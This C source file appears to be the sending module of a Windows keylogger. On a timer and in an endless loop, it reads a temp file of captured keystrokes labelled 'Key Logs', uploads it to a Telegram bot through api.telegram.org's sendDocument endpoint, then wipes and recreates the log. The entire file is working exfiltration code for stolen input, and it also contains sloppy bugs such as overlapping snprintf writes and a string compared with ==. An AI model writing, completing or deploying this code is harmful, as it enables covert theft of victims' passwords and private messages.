#include "Telegram.h"

static void HttpCleanup(HINTERNET *hInternet, HINTERNET *hConnect, HINTERNET *hRequest)
{
	if (hInternet) { InternetCloseHandle(hInternet); }
	if (hConnect) { InternetCloseHandle(hConnect); }
	if (hRequest) { InternetCloseHandle(hRequest); }
}

static char* ReadTempFile() {
	HANDLE hFile = CreateFileA(tempPath, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == 0) { return 0; }

	DWORD fileSize = GetFileSize(hFile, &fileSize);
	DWORD bytesRead;

	char* fileData = (char*)malloc(fileSize + 1 * sizeof(char));

	ReadFile(hFile, fileData, fileSize, &bytesRead, 0);

	fileData[fileSize] = '\0';

	CloseHandle(hFile);

	if (bytesRead == 0) { return 0; }
	else { return fileData; }
}

static int SendDocument(const char* chatId, const char* botToken)
{
	char* formData = (char*)malloc(50000 * sizeof(char));
	char headers[] = "Content-Type: multipart/form-data; boundary=logger";

	snprintf(formData, 50000, "--logger\r\nContent-Disposition: form-data; name=\"document\"; filename=\"Key Logs\"\r\n");
	snprintf(formData, 50000, "%sContent-Type: text/*\r\n\r\n", formData);
	
	char* tempFileText = ReadTempFile();
	if (tempFileText == 0) {
		snprintf(formData, 50000, "%s%s\r\n", formData, "NULL");
	}
	else {
		snprintf(formData, 50000, "%s%s\r\n", formData, ReadTempFile());
	}
	snprintf(formData, 50000, "%s--logger--\r\n", formData);
	
	HINTERNET hInternet = InternetOpenA("Wininet", INTERNET_OPEN_TYPE_PRECONFIG_WITH_NO_AUTOPROXY, 0, 0, 0);
	if (hInternet == 0) { HttpCleanup(hInternet, 0, 0); return 0; }

	HINTERNET hConnect = InternetConnectA(hInternet, "api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
	if (hConnect == 0) { HttpCleanup(hInternet, hConnect, 0); return 0; }

	char* urlPath = (char*)malloc(500 * sizeof(char));
	snprintf(urlPath, 500, "/bot%s/sendDocument?chat_id=%s", botToken, chatId);
	
	HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", urlPath, 0, 0, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_SECURE | INTERNET_FLAG_PRAGMA_NOCACHE, 0);
	free(urlPath);
	if (hRequest == 0) { HttpCleanup(hInternet, hConnect, hRequest); return 0; }

	HttpSendRequestA(hRequest, headers, strlen(headers), formData, strlen(formData));
	
	free(formData);

	LPVOID lpBuffer[24];
	DWORD dwStatusCodeSize = sizeof(lpBuffer) / sizeof(LPVOID);

	HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE, lpBuffer, &dwStatusCodeSize, 0);
	
	HttpCleanup(hInternet, hConnect, hRequest);

	return lpBuffer == "200";
}

static int DeleteTempFile()
{
	if (DeleteFileA(tempPath) == 0) { return 0; };
	HANDLE hFile = CreateFileA(tempPath, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == 0) { return 0; }

	CloseHandle(hFile);
	return 1;
}

void TelegramSender(const char* tgChatId, const char* tgBotToken)
{
	do {
		Sleep(SEND_DELAY * 1000);
		SendDocument(tgChatId, tgBotToken);
		DeleteTempFile();
	} while (1);
}
